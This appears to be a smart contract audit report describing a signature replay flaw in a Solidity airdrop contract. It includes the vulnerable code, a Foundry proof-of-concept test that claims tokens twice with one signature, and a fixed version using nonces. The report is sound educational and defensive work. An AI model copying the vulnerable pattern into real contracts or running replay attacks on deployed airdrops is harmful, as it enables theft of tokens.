## Airdrop Smart contract Audit Report

### Contract: VulnerableAirdrop

#### Overview

The `VulnerableAirdrop` contract allows users to claim a certain amount of tokens by providing a valid signature from a designated signer. However, the contract contains a critical vulnerability that allows signature replay attacks, enabling users to claim tokens multiple times using the same valid signature.

### Vulnerability Details

**Vulnerability**: Signature Replay Attack

**Severity**: High

**Description**: The `VulnerableAirdrop` contract does not keep track of used signatures, allowing attackers to reuse a valid signature to claim tokens multiple times.

### Attack Path

1. A user obtains a valid signature from the designated signer to claim a specific amount of tokens.
2. The user submits the valid signature to the `claimTokens` function and receives the tokens.
3. The user reuses the same valid signature to call the `claimTokens` function again.
4. The contract does not check if the signature has been used before and transfers the tokens again.

### Proof of Code

#### Vulnerable Contract Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

contract VulnerableAirdrop {
    using ECDSA for bytes32;

    IERC20 public token;
    address public signer;  // The address that signs the messages

    event TokensClaimed(address indexed claimant, uint256 amount);

    constructor(address tokenAddress, address signerAddress) {
        token = IERC20(tokenAddress);
        signer = signerAddress;
    }

    function claimTokens(uint256 amount, bytes memory signature) public {
        // Construct the message hash
        bytes32 messageHash = keccak256(abi.encodePacked(
            "\x19Ethereum Signed Message:\n32", 
            keccak256(abi.encodePacked(msg.sender, amount))
        ));

        // Verify the signature
        address recoveredSigner = ECDSA.recover(messageHash, signature);
        require(recoveredSigner == signer, "Invalid signature");

        // Transfer the tokens
        require(token.transfer(msg.sender, amount), "Token transfer failed");

        emit TokensClaimed(msg.sender, amount);
    }
}
```

#### Exploit Test Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "../src/VulnerableAirdrop.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract ERC20Mock is ERC20 {
    constructor(
        string memory name,
        string memory symbol,
        address initialAccount,
        uint256 initialBalance
    ) ERC20(name, symbol) {
        _mint(initialAccount, initialBalance);
    }
}

contract VulnerableAirdropTest is Test {
    using ECDSA for bytes32;

    ERC20Mock token;
    VulnerableAirdrop airdrop;
    address signer;
    address user;

    function setUp() public {
        signer = vm.addr(1);
        user = vm.addr(2);

        token = new ERC20Mock("Test Token", "TST", address(this), 10000 ether);
        airdrop = new VulnerableAirdrop(address(token), signer);

        token.transfer(address(airdrop), 1000 ether);
    }

    function testExploitSignatureReplay() public {
        uint256 amount = 100 ether;
        bytes32 messageHash = keccak256(abi.encodePacked(
            "\x19Ethereum Signed Message:\n32", 
            keccak256(abi.encodePacked(user, amount))
        ));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, messageHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        // First claim
        vm.prank(user);
        airdrop.claimTokens(amount, signature);
        assertEq(token.balanceOf(user), amount);

        // Reuse the same signature to claim again
        vm.prank(user);
        airdrop.claimTokens(amount, signature);
        assertEq(token.balanceOf(user), 2 * amount);
    }
}
```

### Impact

The signature replay vulnerability allows malicious users to claim tokens multiple times with the same signature. This can lead to significant financial losses for the contract owner and deplete the contract's token balance, undermining the integrity and purpose of the airdrop.

### Tools used

Manual Review

### Recommendations

To prevent signature replay attacks, it is crucial to keep track of used signatures or nonces. One effective solution is to include a nonce in the signed message and store each user's nonce. Here's an updated version of the contract with the recommended fix:

#### Fixed Contract Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

contract SecureAirdrop {
    using ECDSA for bytes32;

    IERC20 public token;
    address public signer;  // The address that signs the messages
    mapping(address => uint256) public nonces;  // Keep track of nonces for each user

    event TokensClaimed(address indexed claimant, uint256 amount);

    constructor(address tokenAddress, address signerAddress) {
        token = IERC20(tokenAddress);
        signer = signerAddress;
    }

    function claimTokens(uint256 amount, uint256 nonce, bytes memory signature) public {
        require(nonce == nonces[msg.sender], "Invalid nonce");

        // Construct the message hash
        bytes32 messageHash = keccak256(abi.encodePacked(
            "\x19Ethereum Signed Message:\n32", 
            keccak256(abi.encodePacked(msg.sender, amount, nonce))
        ));

        // Verify the signature
        address recoveredSigner = ECDSA.recover(messageHash, signature);
        require(recoveredSigner == signer, "Invalid signature");

        // Increment the nonce
        nonces[msg.sender]++;

        // Transfer the tokens
        require(token.transfer(msg.sender, amount), "Token transfer failed");

        emit TokensClaimed(msg.sender, amount);
    }
}
```

